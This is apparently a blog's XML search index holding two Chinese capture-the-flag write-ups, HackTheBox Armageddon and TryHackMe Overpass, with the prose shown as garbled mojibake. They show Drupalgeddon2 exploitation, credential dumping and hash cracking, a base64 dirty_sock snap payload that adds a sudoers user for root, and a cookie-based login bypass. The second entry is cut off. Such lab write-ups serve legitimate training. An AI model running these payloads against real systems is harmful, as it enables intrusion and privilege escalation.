<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Hackthebox - Armageddon é¶åœºå®æˆ˜</title>
      <link href="/2022/08/04/Armageddon/"/>
      <url>/2022/08/04/Armageddon/</url>
      
        <content type="html"><![CDATA[<h1 id="é¶åœºä¿¡æ¯"><a href="#é¶åœºä¿¡æ¯" class="headerlink" title="é¶åœºä¿¡æ¯"></a>é¶åœºä¿¡æ¯</h1><img src="/2022/08/04/Armageddon/image1.png" class=""><h1 id="é¶åœºç±»å‹"><a href="#é¶åœºç±»å‹" class="headerlink" title="é¶åœºç±»å‹"></a>é¶åœºç±»å‹</h1><img src="/2022/08/04/Armageddon/image2.png" class=""><h1 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h1><h2 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h2><p>é¦–å…ˆä½¿ç”¨nmapè¿›è¡Œæ‰«æ</p><p>nmap â€“A -sS â€“sC â€“Sv 10.10.10.233</p><img src="/2022/08/04/Armageddon/image3.png" class=""><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¼€å¯äº†22å’Œ80ç«¯å£</p><p>åœ¨80ç«¯å£æç¤ºäº†æˆ‘ä»¬å­˜åœ¨robots.txtæ–‡ä»¶ï¼Œå¹¶ä¸”ä¸œè¥¿å¾ˆå¤š å’±ä»¬è®¿é—®ä¸€ä¸‹</p><img src="/2022/08/04/Armageddon/image4.png" class=""><p>å…¶ä¸­å¼•èµ·æˆ‘å…´è¶£çš„ä¸œè¥¿å‘¢å°±æ˜¯&#x2F;MAINTAINERS.txtæ–‡ä»¶äº†</p><p>è¿™æ˜¯ç»´æŠ¤æ–‡ä»¶ï¼Œæˆ–è€…è¯´æ˜¯å‡çº§æ–‡ä»¶ï¼Œå’±ä»¬æ‰“å¼€çœ‹ä¸€ä¸‹</p><img src="/2022/08/04/Armageddon/image5.png" class=""><p>æœä¸å…¶ç„¶ï¼Œé‡Œé¢æ­éœ²äº†Drupalçš„ç‰ˆæœ¬</p><p>åˆ°è¿™é‡Œæ€è·¯å°±æ˜äº†äº†</p><h1 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h1><p>å’±ä»¬ç›´æ¥ä½¿ç”¨msfè¿›è¡Œgetshell</p><p>ä½¿ç”¨msfconsoleæ‰“å¼€msf</p><p>è¾“å…¥search drupalæœç´¢å¯ç”¨çš„exp</p><img src="/2022/08/04/Armageddon/image6.png" class=""><p>å’±ä»¬å¯¹æ¯”ä¸€ä¸‹ç‰ˆæœ¬å·ï¼Œæœ€åä¸€æ¬¡å‡çº§ä¸º7.56ç‰ˆæœ¬ï¼Œå‡çº§æ—¶é—´ä¸º2017-06-21 ä¹Ÿå°±æ˜¯è¯´åœ¨è¿™ä¹‹å‰çš„expéƒ½å¯ä»¥ç›´æ¥passäº†</p><p>å’±ä»¬æŠŠç›®å…‰æ”¾åœ¨2018-03-28çš„expä¸Š</p><p>use exploit&#x2F;unix&#x2F;webapp&#x2F;drupal_drupalgeddon2</p><p>option</p><p>set RHOSTS 10.10.10.233</p><p>set lhost 10.10.14.135</p><p>exploit</p><img src="/2022/08/04/Armageddon/image7.png" class=""><p>æˆåŠŸè·å–åˆ°ä¸€ä¸ªshell</p><img src="/2022/08/04/Armageddon/image8.png" class=""><p>å’±ä»¬è¿è¡Œä¸€ä¸‹æ— æ³•æŸ¥çœ‹åˆ°uidï¼Œä½†æ˜¯å¯ä»¥æŸ¥çœ‹åˆ°æ–‡ä»¶</p><p>ä½†æˆ‘åä¸ï¼Œæˆ‘å°±æƒ³çŸ¥é“å½“å‰ç”¨æˆ·æ€ä¹ˆåŠï¼Ÿ</p><p>ç®€å•</p><p>è¾“å…¥shell</p><img src="/2022/08/04/Armageddon/image9.png" class=""><p>ä¸€å¼€å§‹æˆ‘ä»¥ä¸ºæ˜¯å¡ä½äº†ï¼Œä½†åæ¥æƒ³æƒ³ä¸å¯¹ï¼Œå¥½åƒæ˜¯è·å–åˆ°äº†</p><img src="/2022/08/04/Armageddon/image10.png" class=""><p>æ‰§è¡Œå‘½ä»¤åç¡®è®¤å‘½ä»¤æ˜¯å¯ä»¥è¢«æ‰§è¡Œçš„ï¼Ÿ</p><p>é‚£å’±ä»¬å…ˆæƒ³åŠæ³•è·å¾—ä¸€ä¸ªç¨³å®šçš„shellå§</p><p>&#x2F;bin&#x2F;bash â€“i</p><img src="/2022/08/04/Armageddon/image11.png" class=""><p>ä¸ä¸€æ ·è¢«æˆ‘æåˆ°shelläº†ï¼Œå¯ç»™æˆ‘NBåäº†ï¼Œå‰ä¼šå„¿è…°</p><img src="/2022/08/04/Armageddon/image12.png" class=""><p>ç”¨æˆ·æ˜¯apacheï¼Œæƒé™è¿˜æ˜¯æœ‰ç‚¹ä½å•Šï¼Œå’±ä»¬åœ¨å†…æ ¸é‡Œçœ‹åˆ°äº†ä¸€ä¸ªåŸŸåï¼Œæˆ–è®¸æœ‰ç”¨ï¼Œå…ˆè®°å½•ä¸‹æ¥å§ï¼Œæš‚æ—¶è¿˜ä¸çŸ¥é“æ˜¯å¹²å˜›çš„ï¼Œå’±ä»¬å¾—æƒ³æƒ³åŠæ³•å»æåˆ°æ›´é«˜ä¸€ç‚¹çš„æƒé™</p><p>æˆ‘åœ¨æŸ¥çœ‹æºç å’Œé…ç½®æ–‡ä»¶çš„æ—¶å€™ï¼Œåœ¨..&#x2F;sites&#x2F;default&#x2F;settings.phpä¸­æ‰¾åˆ°äº†æ•°æ®åº“çš„è´¦å·å¯†ç </p><img src="/2022/08/04/Armageddon/image13.png" class=""><p>database &#x3D;&gt; drupal</p><p>username &#x3D;&gt; drupaluser</p><p>password &#x3D;&gt; CQHEy@9M*m23gBVj</p><p>ä»–ä¸æ˜¯å¼€å¯äº†22ç«¯å£å—ï¼Œå’±ä»¬ç›´æ¥sshç™»å½•å§</p><img src="/2022/08/04/Armageddon/image14.png" class=""><p>å—¯ï¼Ÿå¯†ç ä¸å¯¹ï¼Ÿå•Šè¿™ï¼Œå°±æœ‰ç‚¹å°´å°¬äº†å‘€</p><p>æ²¡äº‹å„¿ï¼Œå’±ä»¬æ¢ä¸€ç§æ–¹æ³•ï¼Œæ—¢ç„¶ä»å¤–é¢æ¥ä¸è¡Œï¼Œé‚£å’±ä»¬å°±ä»é‡Œé¢æ¥ï¼Œå’³å’³ æ²¡å¼€è½¦å“ˆ è¯·ä¸è¦è„‘è¡¥</p><p>åœ¨å’±ä»¬çš„shellé‡Œç›´æ¥ä½¿ç”¨mysqlè¿›è¡Œç™»å½•</p><img src="/2022/08/04/Armageddon/image15.png" class=""><p>å¾ˆå¥‡æ€ªï¼Œæ­£å¸¸è¾“å…¥è´¦å·å¯†ç ä¼šå¡ä½æˆ–è€…æŠ¥é”™æˆ–è€…å‡ºç°ä¸€äº›å¥‡æ€ªçš„ä¸œè¥¿</p><img src="/2022/08/04/Armageddon/image16.png" class=""><p>ç»è¿‡å¤šæ–¹æµ‹è¯•ä»¥åŠæŸ¥æ‰¾èµ„æ–™åï¼Œå¾—å‡ºæ­£ç¡®çš„æŸ¥è¯¢å‘½ä»¤</p><p>mysql -u â€œdrupaluserâ€ -h â€œlocalhostâ€ â€œ-pCQHEy@9M*m23gBVjâ€ â€œdrupalâ€ -e â€œselect uid, name, pass from users;â€</p><img src="/2022/08/04/Armageddon/image17.png" class=""><p>brucetherealadminè´¦æˆ·ä¸€çœ‹è¿™ä¹ˆé•¿å°±çŸ¥é“ä¸ç®€å•ï¼Œä¿—è¯è¯´çš„å¥½ï¼Œé•¿çš„äººä¸€å®šä¸ç®€å•ï¼Œå’‹åŠï¼Ÿçˆ†å®ƒï¼</p><p>å°†ç”¨æˆ·brucetherealadminçš„hashä¿å­˜ä¸ºä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶</p><img src="/2022/08/04/Armageddon/image18.png" class=""><p>è¯·å‡ºæˆ‘ä»¬çš„ç¥å™¨john</p><p>john â€“wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt admin</p><p>çˆ†ç ´æˆåŠŸ</p><img src="/2022/08/04/Armageddon/image19.png" class=""><p>å¯†ç ä¸ºbooboo</p><p>ç°åœ¨å’±ä»¬ç›´æ¥sshç™»å½•å°±å¯ä»¥äº†</p><p>ssh <a href="mailto:brucetherealadmin@10.10.10.233">brucetherealadmin@10.10.10.233</a></p><img src="/2022/08/04/Armageddon/image20.png" class=""><p>OKï¼Œå’±ä»¬ç°åœ¨æ€»ç®—æ˜¯æœ‰ä¸€ä¸ªå®Œæ•´çš„ç”¨æˆ·æƒé™äº†</p><img src="/2022/08/04/Armageddon/image21.png" class=""><p>æˆåŠŸè·å¾—useræƒé™çš„flag</p><p><strong>æƒé™æå‡</strong></p><p>å’±ä»¬ä½¿ç”¨sudo â€“læ¥æŸ¥çœ‹ä¸€ä¸‹sudoæƒé™</p><img src="/2022/08/04/Armageddon/image22.png" class=""><p>å’±ä»¬å¯ä»¥ä¸ä½¿ç”¨å¯†ç å°±è°ƒç”¨rootæƒé™å®‰è£…snapï¼Œé‚£æ€è·¯å°±æœ‰äº†å‘€ï¼Œæèµ·æ¥å…„å¼Ÿä»¬</p><p>ç”Ÿæˆä¸€ä¸ªsnapçš„é©¬</p><p>å‚è€ƒé“¾æ¥ï¼š</p><p>Privilege Escalation in Ubuntu Linux (dirty_sockv2 exploit)ï¼š<a href="https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html">https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html</a></p><p>Playing with Dirty Sockï¼š<a href="https://0xdf.gitlab.io/2019/02/13/playing-with-dirty-sock.html">https://0xdf.gitlab.io/2019/02/13/playing-with-dirty-sock.html</a></p><p>ç”ŸæˆæŒ‡ä»¤ï¼š</p><pre><code>python2 -c &#39;print&quot;aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw&quot;+ &quot;A&quot;*4256 + &quot;==&quot;&#39; | base64 -d &gt; exploit.snap</code></pre><img src="/2022/08/04/Armageddon/image23.png" class=""><p>ç›´æ¥è¿è¡Œæ”¹æ–‡ä»¶ï¼Œå‘ç°è¿˜æœ‰ä¸€ç‚¹é”™è¯¯ï¼Œéœ€è¦æƒ³åŠæ³•è§£å†³ä¸€ä¸‹</p><img src="/2022/08/04/Armageddon/image24.png" class=""><p>åŠ ä¸Š â€“devmode æˆåŠŸå®‰è£…</p><p>sudo &#x2F;usr&#x2F;bin&#x2F;snap install â€“devmode exploit.snap</p><img src="/2022/08/04/Armageddon/image25.png" class=""><p>åˆ‡æ¢åˆ°dirty_sockç”¨æˆ·ï¼Œå¯†ç ä¹Ÿæ˜¯dirty_sock</p><p>æŸ¥çœ‹ä¸€ä¸‹æƒé™</p><img src="/2022/08/04/Armageddon/image26.png" class=""><p>ææƒæˆåŠŸ</p><img src="/2022/08/04/Armageddon/image27.png" class=""><p>æˆåŠŸæ‹¿åˆ°rootæƒé™çš„flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> Hackthebox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TryHackMe - Overpass é¶åœºå®æˆ˜</title>
      <link href="/2022/05/05/Overpass/"/>
      <url>/2022/05/05/Overpass/</url>
      
        <content type="html"><![CDATA[<h1 id="é¶åœºä»‹ç»"><a href="#é¶åœºä»‹ç»" class="headerlink" title="é¶åœºä»‹ç»"></a>é¶åœºä»‹ç»</h1><p>å½“ä¸€ç¾¤ç ´äº§çš„è®¡ç®—æœºç§‘å­¦ä¸“ä¸šçš„å­¦ç”Ÿå°è¯•åˆ¶ä½œå¯†ç ç®¡ç†å™¨æ—¶ä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿæ˜¾ç„¶æ˜¯ä¸€æ¬¡<em>å®Œç¾</em>çš„å•†ä¸šæˆåŠŸï¼</p><p>è¿™ä¸ªç›’å­ä¸Šéšè—ç€ä¸€ä¸ª TryHackMe è®¢é˜…ä»£ç ã€‚ç¬¬ä¸€ä¸ªæ‰¾åˆ°å¹¶æ¿€æ´»å®ƒçš„äººå°†è·å¾—ä¸€ä¸ªæœˆçš„å…è´¹è®¢é˜…ï¼å¦‚æœæ‚¨å·²ç»æ˜¯è®¢é˜…è€…ï¼Œä¸ºä»€ä¹ˆä¸å°†ä»£ç æä¾›ç»™æœ‹å‹å‘¢ï¼Ÿ</p><p>æ›´æ–°ï¼šè¯¥ä»£ç ç°å·²å£°æ˜ã€‚æœºå™¨äº 2020&#x2F;09&#x2F;25 ç¨ä½œä¿®æ”¹ã€‚è¿™åªæ˜¯ä¸ºäº†æé«˜æœºå™¨çš„æ€§èƒ½ã€‚å®ƒä¸å½±å“è¯¥è¿‡ç¨‹ã€‚</p><h1 id="é¶åœºåœ°å€"><a href="#é¶åœºåœ°å€" class="headerlink" title="é¶åœºåœ°å€"></a>é¶åœºåœ°å€</h1><p><a href="https://tryhackme.com/room/overpass">https://tryhackme.com/room/overpass</a></p><h1 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><pre class=" language-bash"><code class="language-bash">â”Œâ”€â”€<span class="token punctuation">(</span>rootğŸ’€lucifiel<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>â””â”€<span class="token comment" spellcheck="true"># nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.29.27</span>Starting Nmap 7.91 <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at 2022-05-05 19:44 CSTNmap scan report <span class="token keyword">for</span> 10.10.29.27Host is up <span class="token punctuation">(</span>0.15s latency<span class="token punctuation">)</span>.Not shown: 65533 closed portsPORT   STATE SERVICE VERSION22/tcp <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol 2.0<span class="token punctuation">)</span><span class="token operator">|</span> ssh-hostkey:<span class="token operator">|</span>   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span><span class="token operator">|</span>   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span><span class="token operator">|</span>_  256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>80/tcp <span class="token function">open</span>  http    Golang net/http server <span class="token punctuation">(</span>Go-IPFS json-rpc or InfluxDB API<span class="token punctuation">)</span><span class="token operator">|</span>_http-title: OverpassNo exact OS matches <span class="token keyword">for</span> host <span class="token punctuation">(</span>If you know what OS is running on it, see https://nmap.org/submit/ <span class="token punctuation">)</span>.TCP/IP fingerprint:OS:SCAN<span class="token punctuation">(</span>V<span class="token operator">=</span>7.91%E<span class="token operator">=</span>4%D<span class="token operator">=</span>5/5%OT<span class="token operator">=</span>22%CT<span class="token operator">=</span>1%CU<span class="token operator">=</span>34521%PV<span class="token operator">=</span>Y%DS<span class="token operator">=</span>2%DC<span class="token operator">=</span>T%G<span class="token operator">=</span>Y%TM<span class="token operator">=</span>6273B8D1OS:%P<span class="token operator">=</span>x86_64-pc-linux-gnu<span class="token punctuation">)</span>SEQ<span class="token punctuation">(</span>SP<span class="token operator">=</span>105%GCD<span class="token operator">=</span>1%ISR<span class="token operator">=</span>107%TI<span class="token operator">=</span>Z%CI<span class="token operator">=</span>Z%II<span class="token operator">=</span>I%TS<span class="token operator">=</span>A<span class="token punctuation">)</span>OPS<span class="token punctuation">(</span>OS:O1<span class="token operator">=</span>M506ST11NW7%O2<span class="token operator">=</span>M506ST11NW7%O3<span class="token operator">=</span>M506NNT11NW7%O4<span class="token operator">=</span>M506ST11NW7%O5<span class="token operator">=</span>M506ST11OS:NW7%O6<span class="token operator">=</span>M506ST11<span class="token punctuation">)</span>WIN<span class="token punctuation">(</span>W1<span class="token operator">=</span>F4B3%W2<span class="token operator">=</span>F4B3%W3<span class="token operator">=</span>F4B3%W4<span class="token operator">=</span>F4B3%W5<span class="token operator">=</span>F4B3%W6<span class="token operator">=</span>F4B3<span class="token punctuation">)</span>ECN<span class="token punctuation">(</span>OS:R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span>40%W<span class="token operator">=</span>F507%O<span class="token operator">=</span>M506NNSNW7%CC<span class="token operator">=</span>Y%Q<span class="token operator">=</span><span class="token punctuation">)</span>T1<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span>40%S<span class="token operator">=</span>O%A<span class="token operator">=</span>S+%F<span class="token operator">=</span>ASOS:%RD<span class="token operator">=</span>0%Q<span class="token operator">=</span><span class="token punctuation">)</span>T2<span class="token punctuation">(</span>R<span class="token operator">=</span>N<span class="token punctuation">)</span>T3<span class="token punctuation">(</span>R<span class="token operator">=</span>N<span class="token punctuation">)</span>T4<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span>40%W<span class="token operator">=</span>0%S<span class="token operator">=</span>A%A<span class="token operator">=</span>Z%F<span class="token operator">=</span>R%O<span class="token operator">=</span>%RD<span class="token operator">=</span>0%Q<span class="token operator">=</span><span class="token punctuation">)</span>T5<span class="token punctuation">(</span>R<span class="token operator">=</span>OS:Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span>40%W<span class="token operator">=</span>0%S<span class="token operator">=</span>Z%A<span class="token operator">=</span>S+%F<span class="token operator">=</span>AR%O<span class="token operator">=</span>%RD<span class="token operator">=</span>0%Q<span class="token operator">=</span><span class="token punctuation">)</span>T6<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span>40%W<span class="token operator">=</span>0%S<span class="token operator">=</span>A%A<span class="token operator">=</span>Z%F<span class="token operator">=</span>OS:R%O<span class="token operator">=</span>%RD<span class="token operator">=</span>0%Q<span class="token operator">=</span><span class="token punctuation">)</span>T7<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span>40%W<span class="token operator">=</span>0%S<span class="token operator">=</span>Z%A<span class="token operator">=</span>S+%F<span class="token operator">=</span>AR%O<span class="token operator">=</span>%RD<span class="token operator">=</span>0%Q<span class="token operator">=</span><span class="token punctuation">)</span>U1<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>N%TOS:<span class="token operator">=</span>40%IPL<span class="token operator">=</span>164%UN<span class="token operator">=</span>0%RIPL<span class="token operator">=</span>G%RID<span class="token operator">=</span>G%RIPCK<span class="token operator">=</span>G%RUCK<span class="token operator">=</span>G%RUD<span class="token operator">=</span>G<span class="token punctuation">)</span>IE<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DFI<span class="token operator">=</span>N%T<span class="token operator">=</span>40%CD<span class="token operator">=</span>OS:S<span class="token punctuation">)</span>Network Distance: 2 hopsService Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernelTRACEROUTE <span class="token punctuation">(</span>using port 1723/tcp<span class="token punctuation">)</span>HOP RTT       ADDRESS1   151.63 ms 10.18.0.12   152.12 ms 10.10.29.27OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token keyword">.</span>Nmap done: 1 IP address <span class="token punctuation">(</span>1 host up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> 46.80 seconds</code></pre><h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><img src="/2022/05/05/Overpass/image.png" class=""><p>æ²¡ä»€ä¹ˆæœ‰ç”¨çš„ä¸œè¥¿ï¼Œå» FUZZ ä¸€ä¸‹</p><h2 id="FUZZ"><a href="#FUZZ" class="headerlink" title="FUZZ"></a>FUZZ</h2><pre class=" language-bash"><code class="language-bash">â”Œâ”€â”€<span class="token punctuation">(</span>rootğŸ’€kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>â””â”€<span class="token comment" spellcheck="true"># gobuster dir -u http://10.10.29.27/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>Gobuster v3.1.0by OJ Reeves <span class="token punctuation">(</span>@TheColonial<span class="token punctuation">)</span> <span class="token operator">&amp;</span> Christian Mehlmauer <span class="token punctuation">(</span>@firefart<span class="token punctuation">)</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Url:                     http://10.10.29.27/<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Method:                  GET<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Threads:                 10<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Negative Status codes:   404<span class="token punctuation">[</span>+<span class="token punctuation">]</span> User Agent:              gobuster/3.1.0<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Timeout:                 10s<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>2022/05/05 07:54:43 Starting gobuster <span class="token keyword">in</span> directory enumeration mode<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>/img                  <span class="token punctuation">(</span>Status: 301<span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: 0<span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> img/<span class="token punctuation">]</span>/downloads            <span class="token punctuation">(</span>Status: 301<span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: 0<span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> downloads/<span class="token punctuation">]</span>/aboutus              <span class="token punctuation">(</span>Status: 301<span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: 0<span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> aboutus/<span class="token punctuation">]</span>  /admin                <span class="token punctuation">(</span>Status: 301<span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: 42<span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> /admin/<span class="token punctuation">]</span>  /css                  <span class="token punctuation">(</span>Status: 301<span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: 0<span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> css/<span class="token punctuation">]</span></code></pre><p>æœ‰ä¸€ä¸ª &#x2F;admin ç›®å½•ï¼Œè¿›å»çœ‹ä¸€ä¸‹</p><img src="/2022/05/05/Overpass/image1.png" class=""><p>ä¸€ä¸ªç™»é™†é¡µé¢ï¼Œä½¿ç”¨å¼±å£ä»¤æ²¡æœ‰è¿›å»ï¼Œçœ‹ä¸€ä¸‹æºä»£ç </p><p>åœ¨é¡µé¢ <a href="http://10.10.29.27/login.js">http://10.10.29.27/login.js</a> ä¸­æ‰¾åˆ°äº†ä¸€å¥</p><pre class=" language-bash"><code class="language-bash">Cookies.set<span class="token punctuation">(</span><span class="token string">"SessionToken"</span>,statusOrCookie<span class="token punctuation">)</span></code></pre><p>åŒæ—¶åœ¨ <a href="http://10.10.29.27/main.js">http://10.10.29.27/main.js</a> è¿˜æœ‰ä¸€ä¸ªå†…å®¹</p><pre class=" language-bash"><code class="language-bash">console.log<span class="token punctuation">(</span><span class="token string">"Hello, World!"</span><span class="token punctuation">)</span></code></pre><p>è¿™é‡Œåº”è¯¥æ˜¯ Cookie è®¾ç½®ç»•è¿‡</p><h1 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h1><p>æŒ‰ F12 æ‰“å¼€æ§åˆ¶å°</p><img src="/2022/05/05/Overpass/image2.png" class=""><p>è¿™é‡Œä¹Ÿç¡®å®è¾“å‡ºäº† â€œHello, Worldâ€</p><p>è¿™é‡Œä¿®æ”¹æˆ‘ä»¬çš„ Payload</p><pre class=" language-bash"><code class="language-bash">Cookies.set<span class="token punctuation">(</span><span class="token string">"SessionToken"</span>, <span class="token string">""</span><span class="token punctuation">)</span></code></pre><p>åœ¨æ§åˆ¶å°è¾“å…¥ä»¥åï¼Œåˆ·æ–°</p><img src="/2022/05/05/Overpass/image3.png" 